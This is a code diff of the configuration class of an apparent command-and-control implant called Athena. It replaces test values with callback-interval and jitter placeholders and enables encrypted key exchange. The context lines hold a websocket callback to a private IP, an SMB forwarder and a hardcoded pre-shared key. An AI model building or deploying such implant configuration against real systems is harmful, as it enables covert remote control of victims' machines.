@@ -23,9 +23,9 @@ namespace Athena.Config
             this.uuid = "6c93238a-f06c-41e8-9bd3-42e77c4f6dfa";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
-            int sleep = int.TryParse("10", out sleep) ? sleep : 60;
+            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
             this.sleep = sleep;
-            int jitter = int.TryParse("0", out jitter) ? jitter : 10;
+            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.currentConfig = new Websocket(this.uuid);
             this.smbForwarder = new SMBForwarder();
@@ -54,10 +54,10 @@ namespace Athena.Config
             string callbackHost = "ws://192.168.4.201";
             this.endpoint = "socket";
             string callbackURL = $"{callbackHost}:{callbackPort}/{this.endpoint}";
-            this.userAgent = "test";
-            this.hostHeader = "test";
+            this.userAgent = "";
+            this.hostHeader = "";
             this.psk = "fzDHD0hRwRRUgIunZBbWF9TvfzhTVzBiCbeWQTVWniQ=";
-            this.encryptedExchangeCheck = bool.Parse("false");
+            this.encryptedExchangeCheck = bool.Parse("True");
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(uuid, this.psk);
